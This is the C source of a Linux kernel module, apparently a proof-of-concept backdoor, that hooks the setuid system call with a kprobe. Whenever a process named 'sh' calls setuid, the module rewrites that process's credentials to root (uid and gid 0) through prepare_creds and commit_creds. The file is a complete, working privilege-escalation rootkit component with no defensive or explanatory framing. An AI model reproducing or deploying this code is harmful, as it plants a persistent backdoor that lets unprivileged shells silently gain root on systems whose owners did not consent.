#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/cred.h>
#include <linux/kprobes.h>
#include <linux/sched.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Marx");
MODULE_DESCRIPTION("Hooking setuid to do a PrivEsc using Kprobe");
MODULE_VERSION("2");

void set_root(void);

// Hooking the setuid syscall by using Kprobe
static struct kprobe kp = { .symbol_name = "__x64_sys_setuid", };

// Pre-handler: runs before the probed instruction
static int handler_pre(struct kprobe *p, struct pt_regs *regs)
{
    unsigned int uid_val = (unsigned int)regs->di; // uid argument as unsigned integer
    struct task_struct *task = current;

    printk(KERN_INFO "Privesc: handler_pre called.\n");
    printk(KERN_INFO "Privesc: uid: %u\n", uid_val);

    // if (uid_val == 1000) {
    //     printk(KERN_INFO "Privesc: Detected setuid(1000) call. Escalating privileges...\n");
    //     set_root();
    // }

    // Check for the specific process name
    if (strcmp(task->comm, "sh") == 0) {
        printk(KERN_INFO "Privesc: Detected process 'sh'. Escalating privileges...\n");
        set_root();
    }

    return 0;
}

void set_root(void)
{
    struct cred *root;

    printk(KERN_INFO "Privesc: Preparing credentials for privilege escalation...\n");
    root = prepare_creds();
    if (root == NULL) {
        printk(KERN_ERR "Privesc: Failed to prepare credentials.\n");
        return;
    }

    // Set the UID and GID to 0 (root)
    root->uid.val = 0;
    root->gid.val = 0;
    root->euid.val = 0;
    root->egid.val = 0;
    root->suid.val = 0;
    root->sgid.val = 0;
    root->fsuid.val = 0;
    root->fsgid.val = 0;

    commit_creds(root);
    printk(KERN_INFO "Privesc: Privilege escalation successful.\n");
}

static int __init privesc_init(void)
{
    int ret;

    printk(KERN_INFO "Privesc: Initializing module...\n");

    kp.pre_handler = handler_pre;
    ret = register_kprobe(&kp);
    if (ret < 0) {
        printk(KERN_ERR "Privesc: Failed to register kprobe: %d\n", ret);
        return ret;
    }

    printk(KERN_INFO "Privesc: Kprobe registered at %p\n", kp.addr);
    return 0;
}

static void __exit privesc_exit(void)
{
    unregister_kprobe(&kp);
    printk(KERN_INFO "Privesc: Module unloaded.\n");
}

module_init(privesc_init);
module_exit(privesc_exit);